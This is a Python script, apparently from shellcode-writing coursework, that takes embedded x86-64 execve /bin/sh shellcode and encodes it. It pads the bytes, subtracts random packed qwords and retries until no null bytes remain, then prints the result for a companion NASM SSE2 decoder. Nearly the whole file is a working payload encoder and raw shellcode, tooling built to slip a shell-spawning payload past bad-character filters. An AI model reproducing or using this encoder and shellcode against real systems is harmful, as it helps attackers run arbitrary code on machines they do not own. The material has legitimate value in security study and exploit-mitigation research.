#!/usr/bin/env python3

# File: sse2_paddq_encoder.py
# Author: Petr Javorik
# Description: This script creates encoded shellcode which can be placed into sse2_paddq_decoder.nasm

import sys
assert sys.version_info >= (3, 5), 'Python >= 3.5 needed!'

from struct import pack
from struct import iter_unpack
from random import randint


# stack execve /bin/sh
SHELLCODE = bytearray(
    b'\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
)

# Pad to dqword multiples (16 bytes)
missing_bytes_count = 16 - (len(SHELLCODE) % 16)
if missing_bytes_count < 16:
    padding = [randint(0x11, 0xbb) for _ in range(missing_bytes_count)]
    SHELLCODE.extend(padding)

# Find minimum qword
min_qword = min(iter_unpack('<Q', SHELLCODE))

encoded_shellcode = bytearray()
while 0x00 in encoded_shellcode or len(encoded_shellcode) == 0:

    encoded_shellcode = bytearray()
    # Generate random 2-qwords pack which is subtracted from
    # every 2-qwords pack in XMM1
    sub_qwords = (
        randint(0x0101010101010101, min_qword[0]-1),
        randint(0x0101010101010101, min_qword[0]-1)
    )

    # Extract 2-qwords packs from SHELLCODE
    qwords2packed = list()
    for pack_ in iter_unpack('<QQ', SHELLCODE):
        qwords2packed.append(tuple(map(lambda x, y: x - y, pack_, sub_qwords)))

    # Compile encoded shellcode
    encoded_shellcode.append(len(qwords2packed))    # loop count goes to RCX
    encoded_shellcode += pack('<QQ', *sub_qwords)   # subtraction value goes to XMM2
    for pack_ in qwords2packed:
        encoded_shellcode += pack('<QQ', *pack_)    # encoded shellcode itself

    # The while loop checks for 0x00 in the encoded shellcode. If 0x00 found,
    # sub_qwords are random generated again

# Print encoded shellcode
print('Original payload length: {}'.format(len(SHELLCODE)))
print('Encoded payload length: {}'.format(len(encoded_shellcode)))
print('nasm:  ', '0x' + ',0x'.join('{:02x}'.format(byte) for byte in encoded_shellcode))
